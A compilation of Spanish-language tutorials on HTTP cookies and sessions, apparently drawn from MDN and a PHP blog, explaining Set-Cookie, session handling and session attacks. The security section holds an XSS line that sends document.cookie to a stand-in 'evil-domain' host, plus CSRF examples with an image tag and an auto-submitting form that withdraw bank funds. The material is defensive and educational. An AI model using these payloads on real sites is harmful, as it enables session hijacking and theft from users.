### Recursos Adicionales <a href="#additional-resources" id="additional-resources"></a>

* [Documentación de Java Servlet](https://docs.oracle.com/javaee/7/api/javax/servlet/package-summary.html)
* [Comprendiendo las Cookies HTTP](https://developer.mozilla.org/es/docs/Web/HTTP/Cookies)
* [Seguridad en Java EE](https://javaee.github.io/javaee-spec/javadocs/javax/security/package-summary.html)
* [Manejo de Sesiones en Servlets de Java](https://www.baeldung.com/java-servlet-session)
* [Mejores Prácticas para la Seguridad en Aplicaciones Web](https://owasp.org/www-project-top-ten/)
* [Gestión Segura de Cookies en Java](https://www.baeldung.com/java-servlet-cookies)

Para profundizar en la implementación de funcionalidades de cierre de sesión seguras y las mejores prácticas en la gestión de sesiones, consulta los recursos anteriores.

## HTTP cookies

Una cookie HTTP, cookie web o cookie de navegador es una pequeña pieza de datos que un servidor envía a el navegador web del usuario. El navegador guarda estos datos y los envía de regreso junto con la nueva petición al mismo servidor. Las cookies se usan generalmente para decirle al servidor que dos peticiones tienen su origen en el mismo navegador web lo que permite, por ejemplo, mantener la sesión de un usuario abierta. Las cookies permiten recordar la información de estado en vista a que el protocolo HTTP es un protocolo sin estado.

Las cookies se utilizan principalmente con tres propósitos:

[Gestión de Sesiones](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#gesti%C3%B3n_de_sesiones)

Inicios de sesión, carritos de compras, puntajes de juegos o cualquier otra cosa que el servidor deba recordar

[Personalización](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#personalizaci%C3%B3n)

Preferencias de usuario, temas y otras configuraciones

[Rastreo](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#rastreo)

Guardar y analizar el comportamiento del usuario

Las cookies se usaron una vez para el almacenamiento general del lado del cliente. Si bien esto era legítimo cuando eran la única forma de almacenar datos en el cliente, hoy en día se recomienda preferir las API de almacenamiento modernas. Las cookies se envían con cada solicitud, por lo que pueden empeorar el rendimiento (especialmente para las conexiones de datos móviles). Las APIs modernas para el almacenamiento del cliente son la [Web storage API](https://developer.mozilla.org/es/docs/Web/API/Web_Storage_API) (`localStorage` y `sessionStorage`) e [IndexedDB](https://developer.mozilla.org/es/docs/Web/API/IndexedDB_API).

**Nota:** Para ver las cookies almacenadas (y otro tipo de almacenamiento que una página web puede usar), puede habilitar el [Inspector de Almacenamiento](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html) en Herramientas del desarrollador y seleccionar Cookies en el árbol de almacenamiento.

### In this article

* [Creando cookies](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#creando_cookies)
* [Seguridad](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#seguridad)
* [Rastreo y privacidad](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#rastreo_y_privacidad)
* [Regulaciones relacionadas a las cookies](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#regulaciones_relacionadas_a_las_cookies)
* [Otras formas de almacenar información en el ](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#otras_formas_de_almacenar_informaci%C3%B3n_en_el_navegador)navegador

[Creando cookies](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#creando_cookies)

Al recibir una solicitud HTTP, un servidor puede enviar un encabezado [`Set-Cookie`](https://developer.mozilla.org/es/docs/Web/HTTP/Reference/Headers/Set-Cookie) con la respuesta. La cookie generalmente es almacenada por el navegador, y luego la cookie se envía con solicitudes hechas al mismo servidor dentro de un encabezado HTTP [`Cookie`](https://developer.mozilla.org/es/docs/Web/HTTP/Reference/Headers/Cookie). Se puede especificar una fecha de vencimiento o duración, después de lo cual ya no se envía la cookie. Además, se pueden establecer restricciones a un dominio y ruta específicos, lo que limita el lugar donde se envía la cookie.

#### [Los encabezados `Set-Cookie` y `Cookie`](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#los_encabezados_set-cookie_y_cookie) <a href="#los_encabezados_set-cookie_y_cookie" id="los_encabezados_set-cookie_y_cookie"></a>

El encabezado de respuesta HTTP [`Set-Cookie`](https://developer.mozilla.org/es/docs/Web/HTTP/Reference/Headers/Set-Cookie) envía las cookies del servidor al agente de usuario. Una cookie simple se establece así:

```
Set-Cookie: <nombre-cookie>=<valor-cookie>
```

Este encabezado del servidor le dice al cliente que almacene una cookie.

**Nota:** Aquí se explica como usar el encabezado `Set-Cookie` en varias aplicaciones del lado del servidor:

* [PHP](https://secure.php.net/manual/en/function.setcookie.php)
* [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
* [Python](https://docs.python.org/3/library/http.cookies.html)
* [Ruby on Rails](http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

Ahora, con cada nueva solicitud al servidor, el navegador enviará todas las cookies almacenadas previamente al servidor utilizando el encabezado [`Cookie`](https://developer.mozilla.org/es/docs/Web/HTTP/Reference/Headers/Cookie).

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

#### [Cookies de sesión](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#cookies_de_sesi%C3%B3n) <a href="#cookies_de_sesion" id="cookies_de_sesion"></a>

La cookie creada anteriormente es una cookie de sesión: se elimina cuando el cliente se cierra, por que no se especificó una directiva `Expires` o `Max-Age` . Sin embargo, los navegadores web pueden usar la **restauración de sesiones**, lo que hace que la mayoría de las cookies de sesión sean permanentes, como si el navegador nunca se cerrara.

#### [Cookies Permanentes](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#cookies_permanentes) <a href="#cookies_permanentes" id="cookies_permanentes"></a>

En lugar de expirar cuando el cliente se cierra, las _cookies permanentes_ expiran en una fecha específica (`Expires`) o tras un periodo de tiempo específico (`Max-Age`).

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

**Nota:** Cuando se establece una fecha de expiración, la fecha y hora que se establece es relativa al cliente en el que se establece la cookie, no del servidor.

#### [Cookies `Secure` y `HttpOnly`](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#cookies_secure_y_httponly) <a href="#cookies_secure_y_httponly" id="cookies_secure_y_httponly"></a>

Una cookie segura sólo se envía al servidor con una petición cifrada sobre el protocolo HTTPS. Incluso con `Secure`, no debería almacenarse _nunca_ información sensible en la cookies, ya que son inherentemente inseguras y este flag no puede ofrecer protección real. A partir de Chrome 52 y Firefox 52, los sitios inseguros (`http:`) no pueden establecer cookies con la directiva `Secure`.

Para prevenir ataques cross-site scripting ([XSS](https://developer.mozilla.org/es/docs/Web/Security/Attacks#cross-site_scripting_xss)), las cookies `HttpOnly` son inaccesibles desde la API de Javascript [`Document.cookie`](https://developer.mozilla.org/es/docs/Web/API/Document/cookie); Solamente se envían al servidor. Por ejemplo, las cookies que persisten sesiones del lado del servidor no necesitan estar disponibles para JavaScript, por lo que debería establecerse el flag `HttpOnly`.

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

#### [Alcance de las cookies](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#alcance_de_las_cookies) <a href="#alcance_de_las_cookies" id="alcance_de_las_cookies"></a>

Las directivas `Domain` y `Path` definen el alcance de la cookie: a qué URLs deberían enviarse las cookies.

`Domain` especifica los hosts permitidos para recibir la cookie. Si no se especifica, toma como valor por defecto el [host del Document.location actual,](https://developer.mozilla.org/en-US/docs/Web/API/Document/location) **excluyendo subdominios**. Si se especifica `Domain`, los subdominios son siempre incluidos.

Por ejemplo, si se establece `Domain=mozilla.org`, las cookies se incluyen en subdominios como `developer.mozilla.org`.

`Path` indica una ruta URL que debe existir en la URL solicitada para enviar el header. El carácter %x2F ("/") es considerado un separador de directorios, y los subdirectorios también coincidirán.

Por ejemplo, si se establece `Path=/docs` estas rutas coincidirán:

* `/docs`
* `/docs/Web/`
* `/docs/Web/HTTP`

#### [Cookies `SameSite` ](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#cookies_samesite) <a href="#cookies_samesite" id="cookies_samesite"></a>

Las cookies `SameSite` permiten a los servidores requerir que una cookie no sea enviada con solicitudes cross-site (donde [Site](https://developer.mozilla.org/en-US/docs/Glossary/Site) es definido por el dominio registrabe), lo que proporciona algo de protección contra ataques cross-site request forgery ([CSRF](https://developer.mozilla.org/es/docs/Glossary/CSRF)).

Las cookies `SameSite` son relativamente nuevas y [soportadas por los principales navegadores](https://developer.mozilla.org/es/docs/Web/HTTP/Reference/Headers/Set-Cookie#browser_compatibility).

Aquí hay un ejemplo:

```
Set-Cookie: key=value; SameSite=Strict
```

El atributo same-site puede tomar uno de los dos valores (case-insensitive):

[`Strict`](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#strict)

Si una cookie same-site tiene este atributo, el navegador sólo enviará cookies si la solicitud se originó en el sitio web que estableció la cookie. Si la solicitud se originó desde una URL diferente que la URL del location actual, no se incluirá ninguna cookie etiquetada con el atributo `Strict`.

[`Lax`](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#lax)

Si el atributo se establece en Lax, las cookies same-site se retienen en (sub)peticiones cross-site, tales como llamadas para cargar imágenes o frames, pero se enviarán cuando un usuario navegue a la URL desde un sitio externo, por ejemplo, siguiendo un enlace.

El comportamiento por defecto de este flag si no está establecido, o no está soportado por el navegador, es incluir las cookies en cualquier solicitud, incluyendo solicitudes corss-origin.

#### [Acceso desde JavaScript usando `Document.cookie`](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#acceso_desde_javascript_usando_document.cookie) <a href="#acceso_desde_javascript_usando_document.cookie" id="acceso_desde_javascript_usando_document.cookie"></a>

También se pueden crear nuevas cookies via JavaScript usando la propiedad [`Document.cookie`](https://developer.mozilla.org/es/docs/Web/API/Document/cookie), y si el flag `HttpOnly` no está establecido, también se puede acceder a las cookies existentes desde JavaScript.

js<a class="button secondary">Copy</a>

```
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

Tenga en cuenta las cuestiones de seguridad en la siguiente sección [Seguridad](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#security). Las cookies disponibles para JavaScript pueden ser robadas por medio de XSS.

### [Seguridad](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#seguridad) <a href="#seguridad" id="seguridad"></a>

**Nota:** Nunca se debe almacenar ni transmitir información confidecial o sensible mediante Cookies HTTP, ya que todo el mecanismo es inherentemente inseguro.

#### [Secuestro de session y XSS](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#secuestro_de_session_y_xss) <a href="#secuestro_de_session_y_xss" id="secuestro_de_session_y_xss"></a>

Las cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión autenticada, así que el robo de una cookie puede implicar el secuestro de la sesión del usuario autenticado. Las formas más comunes de robar cookies incluyen ingeniería social o la explotación de una vulnerabilidad [XSS](https://developer.mozilla.org/es/docs/Web/Security/Attacks#cross-site_scripting_xss) de la aplicación.

js<a class="button secondary">Copy</a>

```
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

El atributo cookie `HttpOnly` puede ayudar a mitigar este ataque evitando el acceso al valor de la cookie a través de JavaScript.

#### [Cross-site request forgery (CSRF)](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#cross-site_request_forgery_csrf) <a href="#cross-site_request_forgery_csrf" id="cross-site_request_forgery_csrf"></a>

[Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) menciona buenos ejemplos para [CSRF](https://developer.mozilla.org/es/docs/Glossary/CSRF). En este caso, alguien puede incluir una imagen que no es realmente una imagen (por ejemplo un chat o foro sin filtrar), que en lugar de esto es realmente una solicitud de tu banco para retirar tu dinero:

html<a class="button secondary">Copy</a>

```
<img
  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
```

Ahora, si tu tienes una sesión iniciada en tu tu cuenta bancaria y las cookies permanecen siendo válidas (y no hay otra validación mas que esa), se realizará la transferencia desde tu cuenta tan pronto como se cargue el html que contiene la imagen. Para los endpoints que requieren una petición de tipo POST, se puede disparar un evento de tipo envío de formulario (posiblemente en un iframe invisible) cuando la página se carga:

html<a class="button secondary">Copy</a>

```
<form action="https://bank.example.com/withdraw" method="POST">
  <input type="hidden" name="account" value="bob" />
  <input type="hidden" name="amount" value="1000000" />
  <input type="hidden" name="for" value="mallory" />
</form>
<script>
  window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }
</script>
```

Se presentan aquí algunas técnicas que se deberían usar para evitar que estas cosas ocurran:

* Los endpoints GET no deben tener acciones de modificación, y si esto se necesita se debería requerir una petición POST. Además los endpoints POST no debería aceptar la intercambiabilidad de aceptar peticiones GET con parametros en _query string_
* Un token CSRF debería ser incluido en cada elemento `<form>` mediante un input oculto. Este token debe ser único para cada usuario y almacenado (por ejemplo, en una _cookie_). De esta forma el servidor puede mirar si el valor requerido es enviado, y en cierto modo lo idea sería descartar la petición si el valor no concuerda con lo esperado.
  * Este método de protección recae en la imposibilidad de que un atacante pueda predecir este token autogenerado en cada inicio de sesión. Cabe aclarar que este token debería ser regenerado en cada inicio de sesión.
* Al igual que con [XSS](https://developer.mozilla.org/es/docs/Web/Security/Attacks#cross-site_scripting_xss), el filtrado de entrada es importante.
* Debería de existir siempre un requerimiento de confirmación para cualquier acción delicada,.
* Las cookies empleadas en acciones delicadas deberían de tener una vida útil breve.
* Para más prevención visita [OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\)_Prevention_Cheat_Sheet).

### [Rastreo y privacidad](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#rastreo_y_privacidad) <a href="#rastreo_y_privacidad" id="rastreo_y_privacidad"></a>

#### [Cookies de terceros](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#cookies_de_terceros) <a href="#cookies_de_terceros" id="cookies_de_terceros"></a>

Las Cookies tienen un dominio asociado a ellas. Si este dominio es el mismo que el dominio de la página en la que el cliente se encuentra, se llama _cookie de origen_. Si el dominio es distinto, se denomina _cookie de terceros_. Si bien las cookies de origen se envían únicamente al servidor que las configura, una página web puede contener imágenes u otros componentes almacenados en servidores de otros dominios (como publicidad). Las cookies que se envían a través de estos componentes de terceros se utilizan principalmente para publicidad y seguimiento en la web. Por ejemplo, [los tipos de cookies utilizadas por Google](https://www.google.com/policies/technologies/types/).

Un servidor de terceros puede crear un perfil del historial y los hábitos de navegación de un usuario basándose en las cookies que le envía el mismo navegador al acceder a varios sitios. Firefox, de forma predeterminada, bloquea las cookies de terceros que se sabe que contienen rastreadores. Las cookies de terceros (o simplemente las cookies de seguimiento) también pueden bloquearse mediante otras configuraciones o extensiones del navegador. El bloqueo de cookies puede provocar que algunos componentes de terceros (como los widgets de redes sociales) no funcionen según lo previsto.

Hay algunas funciones útiles disponibles para los desarrolladores que desean respetar la privacidad del usuario y minimizar el seguimiento de terceros:

* Los servidores pueden (y deberían) configurar el atributo SameSite para especificar si se pueden enviar o no cookies de terceros.
* Las cookies que tienen un estado de partición independiente (CHIPS) les permiten a los desarrolladores habilitar sus cookies en el almacenamiento particionado, con un contenedor de cookies separado por sitio de nivel superior. Esto permite que los usos válidos sin seguimiento de cookies de terceros sigan funcionando en navegadores que no permiten el uso de cookies para el seguimiento de terceros.

### [Regulaciones relacionadas a las cookies](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#regulaciones_relacionadas_a_las_cookies) <a href="#regulaciones_relacionadas_a_las_cookies" id="regulaciones_relacionadas_a_las_cookies"></a>

La legislación o normativa que cubre el uso de cookies incluye:

* El Reglamento General de Privacidad de Datos (RGPD) en la Unión Europea
* La Directiva sobre la privacidad electrónica en la Unión Europea
* Ley de Privacidad del Consumidor de California (CCPA)

Estas regulaciones tienen alcance global. Se aplican a cualquier sitio del internet al que accedan usuarios de estas jurisdicciones (la UE y California, con la salvedad de que la ley de California se aplica sólo a entidades con ingresos brutos superiores a 25 millones de dólares, entre otras cosas).

Estas regulaciones incluyen requisitos tales como:

* Notificar a los usuarios que el sitio utiliza cookies.
* Permitir a los usuarios escoger no recibir algunas o todas las cookies.
* Permitir a los usuarios utilizar la mayor parte del servicio sin recibir cookies.

Puede haber otras regulaciones que rijan el uso de cookies en tu ubicación. La carga de conocer y cumplir estas regulaciones recae sobre usted. Hay empresas que ofrecen un código de "banner de cookies" que le ayuda a cumplir con estas normativas.

### [Otras formas de almacenar información en el navegador](https://developer.mozilla.org/es/docs/Web/HTTP/Guides/Cookies#otras_formas_de_almacenar_informaci%C3%B3n_en_el_navegador) <a href="#otras_formas_de_almacenar_informacion_en_el_navegador" id="otras_formas_de_almacenar_informacion_en_el_navegador"></a>

Otro enfoque para almacenar datos en el navegador es la [API de almacenamiento web](https://developer.mozilla.org/es/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API). Las propiedades [window.sessionStorage](https://developer.mozilla.org/es/docs/Web/API/Window/sessionStorage) y [window.localStorage](https://developer.mozilla.org/es/docs/Web/API/Window/localStorage) corresponden a cookies de sesión y permanentes en duración, pero tienen límites de almacenamiento mayores que las cookies y nunca se envían a un servidor. Se pueden almacenar cantidades de datos más estructuradas y mayores utilizando la [API IndexedDB](https://developer.mozilla.org/es/docs/Web/API/IndexedDB_API) o una biblioteca construida sobre ella.

Existen algunas técnicas diseñadas para recrear las cookies después de eliminarlas. Se conocen como cookies "zombies". Estas técnicas violan los principios de privacidad y control del usuario, pueden violar las regulaciones de privacidad de datos y podrían exponer a un sitio web que las utilice a responsabilidad legal.

## Entendiendo qué son las Cookies y Sessions (desde 0 y con ejemplos)

Tiempo de lectura: 7.48 minutos

![Póster del artículo Entendiendo qué son las Cookies y Sessions (desde 0 y con ejemplos)](https://res.cloudinary.com/pym/image/upload/c_scale,f_auto,q_auto,w_600/v1/articles/2018/auth/cookies-sessions)

Lo que encontrarás en este artículo<i class="fa-chevron-down">:chevron-down:</i>

Entender qué son y cómo funcionan las cookies y sessions es indispensable para comprender el funcionamiento de las aplicaciones web y la Internet en general.

Hoy vamos a repasar este concepto a detalle.

Antes de empezar, ten en cuenta que estos conceptos tradicionales aplican para todas las páginas y navegadores web en general, independientemente del lenguaje de programación usado en el lado del servidor (backend).

Salvo casos específicos, donde no se haga uso de cookies ni sesiones en absoluto (que es realmente poco usual).

### Introducción <a href="#introduccion" id="introduccion"></a>

* Muchas veces, como usuarios, usamos múltiples aplicaciones y sitios web (como redes sociales, foros, blogs, portales de noticia, etcétera) y no somos conscientes de todo lo que ocurre por detrás.
* Muchas veces, como desarrolladores, usamos múltiples frameworks (como Laravel, Django, Ruby on Rails, etcétera) y de la misma forma no conocemos muy bien lo ocurre a más bajo nivel.

Entonces:

* Aunque los frameworks encapsulan detalles específicos y nos permiten ahorrar tiempo en nuestro desarrollo, no debemos pasar por alto tales detalles y debemos procurar estar bien informados.
* Aunque los usuarios (que no son programadores) no necesitan conocer estos temas a un nivel técnico, sí es importante que conozcan los conceptos porque de seguro que usan Internet frecuentemente.

### Visión general <a href="#vision-general" id="vision-general"></a>

Cada vez que visitamos una página, un servidor es el encargado de responder nuestra petición.

Cada solicitud que realizamos y la respuesta que recibimos, son totalmente independientes por naturaleza.

Sin embargo, **el uso de Cookies hace posible la existencia de un estado** entre las distintas peticiones que vamos realizando.

Es decir, **las peticiones HTTP carecen de estado** (stateless), pero **si se apoyan en el uso de Cookies pueden tener uno** (statefull) y con ello modificar lo que los visitantes ven, en función a sus cookies guardadas.

Las Cookies son útiles en múltiples escenarios, tal como se muestra en este [video](https://www.youtube.com/watch?v=I01XMRo2ESg).

Aquí un resumen del video (por si prefieres leer, hacer un recuento, o no se te da muy bien el inglés):

* Las Cookies son archivos que permiten guardar datos acerca de nuestras preferencias.
* En un inicio, cuando recién se crearon, guardaban únicamente información bien puntual. Por ejemplo, en qué lenguaje queremos ver una página web determinada (suponiendo que esté disponible en varios idiomas).
* Para que la página pueda recordar nuestro idioma preferido, guarda una Cookie en nuestra computadora (esto lo gestiona el navegador web; por ejemplo Chrome, Firefox o Safari).
* De esta forma, cuando visitamos una página, esta puede leer las Cookies que tenemos registradas. Las Cookies pueden guardar cualquier dato que el servidor considere importante de recordar. Por ejemplo, la última fecha en que visitamos una página, los productos que hemos cargado a un carrito de compras, los enlaces a los que hicimos clic, etcétera.
* Si una página solicita la creación de una Cookie, entonces la Cookie se registra asociada a dicha página, y no puede ser consultada por una página distinta.
* Aunque en un inicio guardaban información bien puntual, con el paso del tiempo, los datos almacenados en Cookies fueron creciendo a fin de brindar una mejor experiencia de usuario (en base a las propias elecciones de cada usuario o en base a un análisis de su comportamiento en Internet).
* Debido a que las Cookies tienen un límite de tamaño, cuando se tiene mucha información asociada a cada usuario, lo que se hace es guardar la información en el servidor, y guardar en una Cookie únicamente un identificador (que le permita al servidor saber de quién se trata).
* Es importante tener en cuenta que, al visitar un sitio web, este puede contener fragmentos de otros sitios. Por ejemplo, muchos sitios presentan anuncios (que se sirven desde un servidor distinto). En este caso, tanto la página que visitamos, como el servidor que sirve los anuncios, pueden crear Cookies.
* Muchas veces una misma plataforma de anuncios es la que se encarga de proveer de anuncios a una gran cantidad de páginas. En esos casos, es posible que la plataforma haya desarrollado una estrategia para captar información de todas las páginas que muestran sus anuncios, a fin de mostrarnos anuncios en función a las páginas que más frecuentamos.
* ¿Las Cookies son malas? No exactamente. Todo depende de los creadores de la página: la información que almacenan en Cookies y el uso que se le da a esta información.

### Anatomía de las Cookies y ejemplo en PHP <a href="#anatomia-de-las-cookies-y-ejemplo-en-php" id="anatomia-de-las-cookies-y-ejemplo-en-php"></a>

Como comentamos antes, las Cookies son archivos de texto que se guardan en el cliente (computadora de escritorio, tablet, smartphone) con la intención de recordar las preferencias de un visitante sobre una página determinada.

Sin Cookies (y sin ningún otro mecanismo de persistencia de datos), las peticiones serían todas iguales, y cada visita se consideraría siempre como la primera visita que un usuario hace al entrar a una página.

En el uso de Cookies podemos identificar 3 pasos:

* El servidor envía un conjunto de datos en forma de Cookies al navegador web.
* El navegador guarda esta información de forma local (en el dispositivo que se usó, y donde se encuentra instalado el navegador).
* La próxima vez que se realice una petición al servidor, el navegador enviará también la información almacenada en Cookies al servidor, y el servidor usará esta información (para identificar de qué usuario se trata, o para simplemente aplicar cambios inmediatos a la respuesta que está por realizar).

Las Cookies generalmente se registran a través de un "HTTP header" que devuelve el servidor (aunque con Javascript también se pueden definir Cookies sin la presencia de un servidor).

Por ejemplo, un script PHP que quiere asignar una Cookie sobre nuestro navegador, deberá enviar unos headers como los siguientes:

```bash
HTTP/1.1 200 OK
Date: Fri, 04 Feb 2000 21:03:38 GMT
Server: Apache/1.3.9 (UNIX) PHP/4.0b3
Set-Cookie: name=xyz; expires=Friday, 04-Feb-07 22:03:38 GMT; 
                 path=/; domain=programacionymas.com
Connection: close
Content-Type: text/html
```

Como se puede ver, el header `Set-Cookie` contiene:

* un par clave-valor (`name=xyz`)
* una fecha GMT
* una ruta (o `path`)
* y un dominio

El campo `expires` es una instrucción que le dice al navegador que olvide la `cookie` después de la fecha y hora indicadas.

Si el navegador está configurado para almacenar cookies, entonces guardará esta información hasta su fecha y hora de expiración.

Si el usuario visita una página que coincida con la ruta y dominio de la cookie, entonces el navegador enviará nuevamente esta información al servidor.

Los headers enviados por el navegador pueden presentarse de la siguiente forma:

```bash
GET / HTTP/1.0
Connection: Keep-Alive
User-Agent: Mozilla/4.6 (X11; I; Linux 2.2.6-15apmac ppc)
Host: zink.demon.co.uk:1126
Accept: image/gif, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
Cookie: name=xyz
```

En PHP por ejemplo, se puede acceder al valor de la cookie `name` usando `$_COOKIE["name"]`.

### Sessions, ¿qué diferencia tienen respecto a las Cookies? <a href="#sessions-que-diferencia-tienen-respecto-a-las-cookies" id="sessions-que-diferencia-tienen-respecto-a-las-cookies"></a>

Las cookies permiten a una aplicación web acceder a información desde cualquiera de las distintas páginas que presenta.

Las sessions de igual forma. Pero las cookies se guardan en el lado del cliente, y las sesiones, en el lado del servidor.

Veamos de forma más específica que ocurre en el caso de PHP (si no se ha alterado su comportamiento por defecto):

* Una session (al igual que una cookie) crea un archivo (donde se guardarán los datos).
* Sin embargo, **en el caso de las sessions, los archivos se crean en una carpeta del servidor** (allí se guardan las variables de sesión y sus valores correspondientes).
* La ubicación del archivo temporal se determina en el archivo de configuración `php.ini`, a través de una variable llamada `session.save_path`.

La definición de una sesión comprende los siguientes pasos:

* PHP crea un identificador único (para cada session, de forma particular). Este identificador es una cadena aleatoria compuesta por 32 caracteres en hexadecimal (por ejemplo `3c7foj34c3jj973hjkop2fc937e3443`).
* Una cookie llamada `PHPSESSID` se envía automáticamente al cliente, para que guarde la cadena de identificación (antes generada). De esta forma el cliente queda asociado a la session.
* Un archivo es creado en el servidor automáticamente, en la carpeta designada, y recibe como nombre el identificador pero con el prefijo `sess_`. Por ejemplo `sess_3c7foj34c3jj973hjkop2fc937e3443`.

Cuando un código de PHP quiere acceder al valor de una variable de sesión, PHP automáticamente obtiene el "identificador único de sesión" (que es la cadena de la que hablamos antes) desde la cookie `PHPSESSID` y luego busca en la carpeta designada el archivo asociado a este identificador.

Generalmente una sesión (session) termina cuando el usuario cierra completamente el navegador, o si abandona el sitio por un periodo de tiempo de determinado (usualmente tras 30 minutos).

Es importante tener en cuenta que **también se puede sobreescribir este comportamiento**.

En PHP, por ejemplo, podemos escribir nuestro propio gestor de sesiones. A esto se le conoce como _Custom Session Handlers_.

Esto significa que podemos escribir nuestra propia implementación y decirle a PHP cómo tratar las sesiones. [Aquí por ejemplo](https://www.youtube.com/watch?v=ivUX8ne2MVI) se explica cómo guardar las sesiones en una base de datos, en vez de archivos.

### Recapitulando <a href="#recapitulando" id="recapitulando"></a>

* Las peticiones HTTP son stateless por naturaleza. Esto significa que cada petición realizada es independiente, incluso si se realiza desde la misma computadora por una misma persona.
* **A fin de guardar datos con las preferencias de los visitantes se utilizan las cookies**. Estas cookies se guardan en el navegador web de cada visitante (usualmente como petición del servidor, a través de un header llamado [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)).
* Las cookies generalmente están limitadas por un **tamaño máximo**. Así mismo, están expuestas en el lado del cliente (las cookies son **client-side**).
* Una solución ante esto último involucra tanto el uso de sesiones como el uso de cookies. Las sesiones se guardan en el servidor, pero se asocian a una cookie creada en el cliente (navegador web). Esta cookie permite al navegador web mostrar su identificación ante el servidor, y que este reconozca sus datos.

Si deseas también puedes ver esta [explicación de cookies y sessions (video en inglés)](https://www.youtube.com/watch?v=64veb6tKTm0): es una analogía que se hace a modo de ejemplo, donde un cliente frecuenta una tienda de café.

### Problemas de seguridad <a href="#problemas-de-seguridad" id="problemas-de-seguridad"></a>

Este tema de `cookies` y `sessions` es muy interesante.

Pero asociado a esto, nos encontramos con que generalmente son un objetivo frecuente de ataque.

**La mayoría de los ataques de sesión implican suplantación** (el atacante intenta obtener acceso a la sesión de otro usuario haciéndose pasar por dicho usuario).

La información más crucial para un atacante es el **identificador de sesión** (necesario para cualquier ataque de suplantación).

Existen 3 métodos, que son utilizados comúnmente para obtener un identificador de sesión válido:

* Predicción (Prediction)
* Captura (Capture)
* Fijación (Fixation)

Veamos una breve descripción de cada uno de ellos.

#### Predicción <a href="#prediccion" id="prediccion"></a>

El método de predicción consiste en "adivinar" un identificador de sesión válido.

A día de hoy, es **poco probable que este sea un punto débil**.

El mecanismo por defecto de PHP genera un identificador de sesión de forma "extremadamente" aleatoria (debido a la gran cantidad de valores posibles que puede adoptar la cadena generada).

#### Captura <a href="#captura" id="captura"></a>

La captura de un identificador de sesión válido es el método más común de ataque, y hay muchas formas de llevarlo a cabo.

Dado que los identificadores de sesión se propagan típicamente a través de cookies o variables GET, los diferentes enfoques se centran en atacar estos métodos de transferencia.

Siempre que las cookies están disponibles, se prefiere su uso como mecanismo para comunicar el identificador de sesión al cliente, en vez del uso de variables GET, que generalmente están más expuestas.

La mayoría de vulnerabilidades, asociadas a cookies, se han encontrado en Internet Explorer.

#### Fijación <a href="#fijacion" id="fijacion"></a>

La fijación es el método más simple para obtener un identificador de sesión válido.

No es muy difícil defenderse ante esta vulnerabilidad. Sin embargo, si usas PHP y tu mecanismo de sesión consiste únicamente en usar `session_start()`, eres vulnerable ante este ataque.

La mayoría de ataques por "fijación de sesión" consiste en ocasionar que el usuario realice una petición a un sitio externo.

Esto se puede lograr añadiendo un enlace, cargando una imagen (que ejecuta código por detrás) u ocasionando una redirección, por ejemplo.

La idea es que el usuario visite una URL con un identificador de sesión adjunto a esta URL.

Dado que el atacante escoge el identificador (al enviarlo al servidor), ya lo conoce de antemano. Por lo tanto puede llevar a cabo ataques de suplantación (secuestrando la sesión del usuario sin que este se entere).

### Referencias <a href="#referencias" id="referencias"></a>

Algunos sitios que fueron consultados durante la elaboración de este artículo:

* [PHP Cookies](https://www.tutorialspoint.com/php/php_cookies.htm)
* [PHP Sessions](https://www.tutorialspoint.com/php/php_sessions.htm)
* [PHP Sessions explained](https://justinmccormick.com/programming/php-sessions-explained)
* [PHP Security Guide: Sessions](http://phpsec.org/projects/guide/4.html)
